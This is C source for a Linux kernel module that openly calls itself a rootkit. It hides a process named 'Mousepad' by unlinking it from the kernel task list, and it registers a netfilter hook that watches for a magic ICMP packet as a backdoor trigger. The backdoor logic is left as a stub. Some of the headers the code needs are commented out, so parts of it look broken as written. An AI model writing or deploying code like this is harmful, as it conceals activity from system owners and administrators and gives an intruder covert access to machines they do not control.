#include <linux/module.h>  
#include <linux/kernel.h>
#include <linux/sched.h>
//#include <linux/kallsyms.h>
#include <linux/string.h>
//#include <linux/rculist.h>
//#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
//#include <linux/workqueue.h>
//#include <linux/slab.h>
//#include <net/net_namespace.h>
#include <linux/ip.h>        
#include <linux/icmp.h>     

MODULE_LICENSE("GPL");

#define HIDDEN_PROC "Mousepad"
#define MAGIC_ICMP_TYPE 100

// Work container for ICMP backdoor
struct work_cont {
    struct work_struct work;
    // Add any custom fields you need
};

static struct work_cont *my_container;

// Forward declarations
static unsigned int watch_icmp(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
void example_function(struct work_struct *work);

// Process hiding functionality
static void hide_process(const char *target)
{
    struct task_struct *task;

    rcu_read_lock();
    for_each_process(task) {
        if (strcmp(task->comm, target) == 0) {
            list_del_rcu(&task->tasks);
            printk(KERN_INFO "[ZK] Hiding process: %s (PID=%d)\n", task->comm, task->pid);
        }
    }
    rcu_read_unlock();
}

// ICMP backdoor handler
static unsigned int watch_icmp(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    
    if (!skb)
        return NF_ACCEPT;
        
    ip_header = ip_hdr(skb);
    
    if (ip_header->protocol == IPPROTO_ICMP) {
        struct icmphdr *icmp_header;
        
        if (skb->len < sizeof(struct iphdr) + sizeof(struct icmphdr))
            return NF_ACCEPT;
            
        icmp_header = icmp_hdr(skb);
        
        if (icmp_header->type == MAGIC_ICMP_TYPE) {
            printk(KERN_INFO "[ZK] Magic ICMP packet received!\n");
            // Add your backdoor logic here
        }
    }
    return NF_ACCEPT;
}

// Netfilter hook structure
static struct nf_hook_ops pre_hook = {
    .hook     = watch_icmp,
    .pf       = PF_INET,
    .hooknum  = NF_INET_PRE_ROUTING,
    .priority = NF_IP_PRI_FIRST,
};

// Workqueue function
void example_function(struct work_struct *work)
{
    struct work_cont *container = container_of(work, struct work_cont, work);
    printk(KERN_INFO "[ZK] Workqueue function executed\n");
}

static int __init zk_init(void)
{
    int ret;
    
    printk(KERN_INFO "[ZK] Rootkit loading...\n");
    
    // Hide target process
    hide_process(HIDDEN_PROC);
    
    // Setup ICMP backdoor
    my_container = kmalloc(sizeof(*my_container), GFP_KERNEL);
    if (!my_container)
        return -ENOMEM;
    
    // Initialize workqueue
    INIT_WORK(&my_container->work, example_function);
    
    // Register netfilter hook
    ret = nf_register_net_hook(&init_net, &pre_hook);
    if (ret != 0) {
        kfree(my_container);
        return ret;
    }
    
    printk(KERN_INFO "[ZK] Rootkit loaded successfully.\n");
    return 0;
}

static void __exit zk_exit(void)
{
    printk(KERN_INFO "[ZK] Rootkit unloaded.\n");
    
    // Cleanup ICMP backdoor
    nf_unregister_net_hook(&init_net, &pre_hook);
    
    if (my_container) {
        kfree(my_container);
        my_container = NULL;
    }
}

module_init(zk_init);
module_exit(zk_exit);
